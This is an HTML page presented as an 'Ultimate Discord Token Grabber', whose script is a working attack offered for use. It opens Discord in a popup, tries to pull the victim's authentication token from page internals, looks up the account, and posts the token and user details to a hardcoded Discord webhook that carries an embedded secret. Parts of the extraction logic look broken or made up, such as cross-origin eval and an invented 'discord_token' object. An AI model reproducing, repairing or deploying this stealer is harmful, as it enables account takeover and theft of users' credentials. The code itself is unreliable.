<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Discord Token Grabber</title>
    <style>
        body {
            background-color: #2f3136;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #36393f;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            text-align: center;
            width: 350px;
        }
        h2 { margin-top: 0; color: #fff; }
        button {
            background-color: #5865F2;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover { background-color: #4752c4; }
        button:disabled { background-color: #4f545c; cursor: not-allowed; }
        #status {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
            white-space: pre-line;
        }
        .success { color: #43b581; }
        .error { color: #f04747; }
        .loading { color: #faa61a; }
        .info { color: #3498db; }
    </style>
</head>
<body>

<div class="container">
    <h2>Ultimate Token Grabber</h2>
    <p style="font-size: 14px; color: #b9bbbe; margin-bottom: 20px;">
        1. Click "Start Grabbing"<br>
        2. Allow Popup if asked<br>
        3. Token will be auto-sent
    </p>
    <button id="grabBtn">Start Grabbing</button>
    <div id="status"></div>
</div>

<script>
    // 🔴 YOUR WEBHOOK URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1540654249497858088/JyWZUTP9bNayBjd0dAYM6ooCrKYi3ZY53XX_Wl7iJEEDPQR-CcGO7TwYDF2lCQ7gIiiH";

    const statusEl = document.getElementById('status');
    const grabBtn = document.getElementById('grabBtn');

    function setStatus(msg, type = '') {
        statusEl.textContent = msg;
        statusEl.className = type;
    }

    grabBtn.addEventListener('click', async () => {
        grabBtn.disabled = true;
        setStatus('Opening Discord...', 'loading');

        // Open Discord App
        const popup = window.open('https://discord.com/app', 'discord-popup', 'width=900,height=700');

        if (!popup) {
            setStatus('❌ Popup blocked! Allow popups.', 'error');
            grabBtn.disabled = false;
            return;
        }

        // Close check
        const closeCheck = setInterval(() => {
            if (popup.closed) {
                clearInterval(closeCheck);
                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Found')) {
                    setStatus('⚠️ Popup closed manually.', 'error');
                    grabBtn.disabled = false;
                }
            }
        }, 500);

        // Start Grabbing Process
        setTimeout(() => {
            if (!popup.closed) {
                tryModernGrab(popup); // 1. Try Modern Method
            }
        }, 2000); // Wait 2 seconds for popup to load
    });

    // 🚀 METHOD 1: Modern Console Extraction (Fastest)
    function tryModernGrab(popupWindow) {
        setStatus('🔍 Scanning Console (Modern Method)...', 'loading');
        
        try {
            // Access the internal Discord object via the console
            // 'discord_token' is the standard object name in modern builds
            const token = popupWindow.eval('discord_token.default._token');
            
            if (token && typeof token === 'string' && token.length > 10) {
                setStatus('✅ Modern Token Found!', 'success');
                sendToken(token, popupWindow);
                return;
            }
        } catch (e) {
            // If it fails, it might not exist yet or method is different
            console.log("Modern method failed, trying Webpack...");
        }

        // 🛡️ METHOD 2: Universal Webpack Scan (Fallback)
        setStatus('⚙️ Fallback: Scanning Webpack...', 'info');
        setTimeout(() => {
            const webpackToken = tryGetToken(popupWindow);
            if (webpackToken) {
                setStatus('✅ Webpack Token Found!', 'success');
                sendToken(webpackToken, popupWindow);
            } else {
                // Start polling if both initial methods fail
                pollForToken(popupWindow);
            }
        }, 1000);
    }

    // 🛡️ METHOD 2: Universal Webpack Scan (Old School but Reliable)
    function tryGetToken(win) {
        try {
            if (!win.webpackChunkdiscord_app) return null;
            const chunk = win.webpackChunkdiscord_app;
            if (!Array.isArray(chunk)) return null;

            for (let i = 0; i < chunk.length; i++) {
                const currentChunk = chunk[i];
                if (!currentChunk) continue;
                for (const key in currentChunk) {
                    const module = currentChunk[key];
                    if (!module) continue;
                    
                    const candidates = [
                        module._token, module.token, module.accessToken, 
                        module._authToken, module._accessToken,
                        module.default?._token, module.default?.token, 
                        module.default?.accessToken, module.default?._authToken,
                        module.default?._accessToken
                    ];

                    for (const candidate of candidates) {
                        if (candidate && typeof candidate === 'string' && candidate.startsWith('MT')) {
                            return candidate;
                        }
                    }
                }
            }
        } catch (e) {}
        return null;
    }

    // 🔄 Polling for later loads
    function pollForToken(popupWindow) {
        let attempts = 0;
        const maxAttempts = 800; 
        const interval = setInterval(() => {
            if (popupWindow.closed || attempts > maxAttempts) {
                clearInterval(interval);
                if (!popupWindow.closed) {
                    setStatus('⏱️ Timeout: Could not find token.', 'error');
                    grabBtn.disabled = false;
                }
                return;
            }
            attempts++;
            const token = tryGetToken(popupWindow) || tryModernToken(popupWindow); // Check both
            if (token) {
                clearInterval(interval);
                setStatus('✅ Polling: Token Found!', 'success');
                sendToken(token, popupWindow);
            }
        }, 50);
    }

    // Helper for modern token in polling
    function tryModernToken(win) {
        try {
            return win.eval('discord_token.default._token');
        } catch(e) { return null; }
    }

    async function sendToken(token, popupWindow) {
        try {
            // Fetch User Info
            let userInfo = "Unknown User";
            try {
                const userRes = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': token }
                });
                if (userRes.ok) {
                    const userData = await userRes.json();
                    userInfo = `${userData.username}${userData.discriminator !== '0' ? '#' + userData.discriminator : ''} (${userData.id})`;
                }
            } catch (e) {
                userInfo = "Could not fetch user info";
            }

            // Send to Webhook
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🔓 New Discord Token",
                        color: 5793266,
                        fields: [
                            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                            { name: "User", value: userInfo, inline: false },
                            { name: "Method", value: "Hybrid Grab", inline: false },
                            { name: "Time", value: new Date().toLocaleString(), inline: false }
                        ]
                    }]
                })
            });

            if (res.ok) {
                setStatus('✅ Token Sent Successfully!', 'success');
                popupWindow.close();
                grabBtn.disabled = false;
            } else {
                setStatus('❌ Webhook Error: ' + res.status, 'error');
                grabBtn.disabled = false;
            }
        } catch (e) {
            setStatus('❌ Network Error', 'error');
            grabBtn.disabled = false;
        }
    }
</script>

</body>
</html>
